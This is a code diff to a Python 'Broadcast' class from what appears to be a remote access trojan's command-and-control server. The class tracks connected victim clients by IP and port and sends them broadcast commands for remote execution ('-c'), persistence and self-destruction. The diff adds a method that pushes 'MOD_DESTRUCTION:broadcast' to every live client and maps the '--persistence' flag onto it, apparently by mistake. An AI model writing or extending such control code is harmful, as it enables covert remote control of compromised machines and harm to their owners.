@@ -49,6 +49,20 @@ class Broadcast:
         
         self.broadcast_to_all_clients(cmd) #send command for all client
 
+    def destruction_for_all_clients(self):
+        
+        request = "MOD_DESTRUCTION:broadcast"
+        for key in Handler.dict_conn.keys():
+            if(Handler.dict_conn[key][NB_ALIVE]):
+                if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
+                    printColor("information","[-] (in broadcast lol) Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
+                    CheckConn().connexionIsDead(key) 
+
+                else:
+                    printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
+            else:
+                pass
+
     def disconnection_for_all_clients(self):
         pass
 
@@ -66,7 +80,6 @@ class Broadcast:
         if not(whitout_MOD_ALL): 
             request = "MOD_ALL:"+data
         else:
-            print("GO TO SEND PERSISTENCE BB")
             request = data
 
         print("request --->",request)
@@ -105,7 +118,7 @@ class Broadcast:
                             self.broadcast_to_all_clients("MOD_DESTRUCTION:broadcast",True)
                         
                         elif(forall[i] == "--persistence"):
-                            self.broadcast_to_all_clients("MOD_PERSISTENCE:broadcast",True)
+                            self.destruction_for_all_clients()
                         
                         elif(forall[i] == "-c"):
                             self.executeCommand(forall)
